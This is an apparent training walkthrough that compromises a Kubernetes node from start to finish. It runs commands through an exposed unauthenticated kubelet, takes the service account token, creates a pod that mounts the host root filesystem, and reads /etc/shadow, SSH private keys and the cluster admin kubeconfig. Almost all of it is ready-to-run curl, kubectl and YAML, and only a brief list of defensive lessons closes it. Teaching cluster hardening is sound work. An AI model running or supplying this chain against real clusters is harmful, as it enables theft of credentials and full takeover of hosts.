
# Kubernetes Node Compromise – Technical Walkthrough (Real-World Validation)

---

# 1️⃣ Discover Exposed Kubelet

Port scan reveals:

```
10250/tcp open  kubelet
```

Test:

```bash
curl -k https://<NODE_IP>:10250/pods
```

If it returns pod metadata without authentication:

✅ Kubelet is exposed  
✅ No authentication enforced  

This is critical.

---

# 2️⃣ Execute Commands Inside a Pod

Use kubelet:

```bash
curl -k -X POST \
"https://<NODE_IP>:10250/run/<namespace>/<pod>/<container>" \
-d "cmd=id"
```

If you see:

```
uid=0(root)
```

You have container-level root.

---

# 3️⃣ Confirm Container Context

Check cgroups:

```bash
cat /proc/1/cgroup
```

If it shows docker/containerd paths:

✅ You are inside a container.

---

# 4️⃣ Extract Service Account Token

Inside the container:

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

Use these to authenticate to the API server.

---

# 5️⃣ Authenticate to Kubernetes API

```bash
kubectl --token=$TOKEN \
  --certificate-authority=ca.crt \
  --server=https://<API_SERVER> \
  get pods
```

If successful:

✅ Service account is valid.

---

# 6️⃣ Check RBAC Permissions

```bash
kubectl auth can-i --list
```

If you see:

```
pods   [get create list]
```

That means:

✅ You can create pods  
✅ You can escalate privileges  

---

# 7️⃣ Create Malicious Pod Mounting Host Root

Example YAML:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: host-mount
spec:
  containers:
  - name: host-mount
    image: nginx
    command: ["/bin/sh"]
    args: ["-c", "sleep 10000"]
    volumeMounts:
    - name: host-root
      mountPath: /mnt
  volumes:
  - name: host-root
    hostPath:
      path: /
```

Apply:

```bash
kubectl apply -f host-mount.yaml
```

---

# 8️⃣ Use Kubelet to Execute in Malicious Pod

If `kubectl exec` is blocked, use kubelet again:

```bash
curl -k -X POST \
"https://<NODE_IP>:10250/run/default/host-mount/host-mount" \
-d "cmd=ls /mnt"
```

You are now looking at the host filesystem.

---

# 9️⃣ Prove Node-Level Root Access (Real Linux Validation)

Instead of reading flags, read standard Linux-sensitive files.

---

## ✅ Confirm Root Access

Check:

```bash
cat /mnt/etc/shadow
```

If readable:

✅ You have root-level access to the host.

Why?

`/etc/shadow` is readable only by root.

---

## ✅ Confirm System-Wide User Enumeration

```bash
cat /mnt/etc/passwd
```

Shows all local system users.

---

## ✅ Confirm Host Root Home Access

```bash
ls /mnt/root
```

If accessible:

✅ You can access root’s home directory.

---

## ✅ Confirm SSH Keys Access

```bash
cat /mnt/root/.ssh/authorized_keys
```

Or:

```bash
cat /mnt/home/<username>/.ssh/id_rsa
```

If readable:

✅ SSH private key exposure.

---

## ✅ Confirm Kubernetes Node Secrets

```bash
ls /mnt/etc/kubernetes
```

Possible sensitive files:

- `admin.conf`
- `kubelet.conf`
- `pki/`

Reading:

```bash
cat /mnt/etc/kubernetes/admin.conf
```

Would grant cluster-admin credentials.

---

# 🔥 Full Compromise Chain (ASCII Diagram)

```
[Attacker]
     |
     v
[Port Scan]
     |
     v
[Exposed Kubelet :10250]
     |
     v
[List Pods]
     |
     v
[Execute Command in Container]
     |
     v
[Extract Service Account Token]
     |
     v
[Access Kubernetes API]
     |
     v
[RBAC: Can Create Pods]
     |
     v
[Create Malicious Pod]
     |
     v
[Mount Host Filesystem (/)]
     |
     v
[Execute via Kubelet]
     |
     v
[Read /etc/shadow]
     |
     v
[Full Node Root Access]
```

---

# 🎓 What This Demonstrates (Real-World Impact)

This attack allows:

- Reading `/etc/shadow` → password hash extraction
- Reading SSH private keys
- Reading Kubernetes admin kubeconfig
- Reading service account tokens
- Modifying host files
- Planting persistence
- Complete node takeover

This is not container escape.

This is full host compromise.

---

# 🛡️ Defensive Lessons

1. Never expose kubelet externally.
2. Disable anonymous kubelet authentication.
3. Restrict service account permissions.
4. Prevent `hostPath` usage via policy.
5. Segment Kubernetes node networks.

---

# 🧠 Teaching Summary

In Kubernetes:

```
Exposed Kubelet
        +
Service Account Token
        +
Pod Creation Permission
        +
hostPath
        =
Full Linux Root Access
```

##
##
